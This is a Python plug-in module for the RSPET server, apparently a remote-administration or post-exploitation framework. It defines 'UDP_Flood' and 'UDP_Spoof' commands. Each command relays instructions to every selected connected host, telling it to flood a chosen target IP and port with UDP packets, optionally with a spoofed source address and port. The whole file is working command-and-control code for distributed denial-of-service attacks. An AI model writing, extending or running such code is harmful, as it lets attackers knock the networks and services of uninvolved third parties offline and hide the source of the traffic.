"""
Plug-in module for RSPET server. Offer functions related to udp flooding.
"""
from __future__ import print_function
from socket import error as sock_error
from Plugins.mount import Plugin

class Files(Plugin):
    """
    Class expanding Plugin.
    """
    __server_commands__ = {}
    __cmd_help__ = {}

    def __init__(self):
        """
        Declare plugin's CLI commands their syntax and their scope.
        """
        self.__server_commands__["UDP_Flood"] = [self.udp_flood, "connected",
                                               "multiple"]
        self.__cmd_help__["UDP_Flood"] =\
        "UDP_Flood <target_ip> <target_port> [payload]"
        self.__server_commands__["UDP_Spoof"] = [self.udp_spoof, "connected",
                                               "multiple"]
        self.__cmd_help__["UDP_Spoof"] =\
        "UDP_Spoof <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]"

    def udp_flood(self, server, args):
        """Flood target machine with UDP packets."""
        ret = [None,0,""]
        hosts = server.get_selected()
        if len(args) < 2:
            ret[2] = ("Syntax : %s" % self.__cmd_help__["UDP_Flood"])
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            try:
                # IP:port:payload
                cmd = "%s:%s:%s" % (args[0], args[1], args[2])
            except IndexError:
                cmd = "%s:%s:Hi" % (args[0], args[1])
            for host in hosts:
                try:
                    host.send(host.command_dict['udpFlood'])
                    host.send("%03d" % len(cmd))
                    host.send(cmd)
                except sock_error:
                    host.purge()
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
        return ret

    def udp_spoof(self, server, args):
        """Flood target machine with UDP packets via spoofed ip & port."""
        ret = [None,0,""]
        hosts = server.get_selected()
        if len(args) < 4:
            ret[2] = ("Syntax : %s" % self.__cmd_help__["UDP_Spoof"])
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            try:
                # IP:port:new_ip:new_port:payload
                cmd = "%s:%s:%s:%s:%s" % (args[0], args[1], args[2], args[3], args[4])
            except IndexError:
                cmd = "%s:%s:%s:%s:Hi" % (args[0], args[1], args[2], args[3])
            for host in hosts:
                try:
                    host.send(host.command_dict['udpSpoof'])
                    host.send("%03d" % len(cmd))
                    host.send(cmd)
                except sock_error:
                    host.purge()
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
        return ret
